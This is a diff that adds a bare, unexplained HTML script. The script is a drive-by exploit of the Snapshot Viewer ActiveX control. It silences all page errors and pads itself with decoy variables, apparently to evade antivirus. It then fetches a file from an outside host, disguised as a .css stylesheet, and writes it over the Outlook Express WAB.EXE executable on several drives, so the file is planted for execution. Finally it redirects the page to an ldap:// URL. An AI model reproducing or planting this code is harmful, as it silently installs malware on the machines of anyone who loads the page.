@@ -1,0 +1,51 @@
+<script type="text/javascript">
+function killErrors() {
+return true;
+}
+window.onerror = killErrors;
+
+var fuckavo="SB";
+var x;
+var fuckavp="SB";
+var obj;
+var fuckavx="SB";
+var mycars = new Array();
+var fuckava="SB";
+mycars[0] = "c:/Program Files/Outlook Express/WAB.EXE";
+mycars[1] = "d:/Program Files/Outlook Express/WAB.EXE";
+mycars[2] = "e:/Program Files/Outlook Express/WAB.EXE";
+
+var objlcx = new ActiveXObject("snpvw.Snapshot Viewer Control.1");
+
+if(objlcx="[object]")
+{
+
+setTimeout('window.location = "ldap://"',3000);
+
+for (x in mycars)
+{
+obj = new ActiveXObject("snpvw.Snapshot Viewer Control.1")
+
+var yrtytr="ghjhgjyrt";
+
+var buf1 = 'http://www.zmjjjyy.cn/new/a1.css';
+var nbv="nvbfdsf";
+var buf2=mycars[x];
+var hfgnvbj="wertgx";
+
+var gghfsdfdvj="fsdfssd";
+obj.Zoom = 0;
+obj.ShowNavigationButtons = false;
+obj.AllowContextMenu = false;
+obj.SnapshotPath = buf1;
+
+try
+{
+obj.CompressedPath = buf2;
+obj.PrintSnapshot();}catch(e){}
+
+}
+}
+var ghdg="SB";
+var jhsnfvasxa="SBd";
+</script>
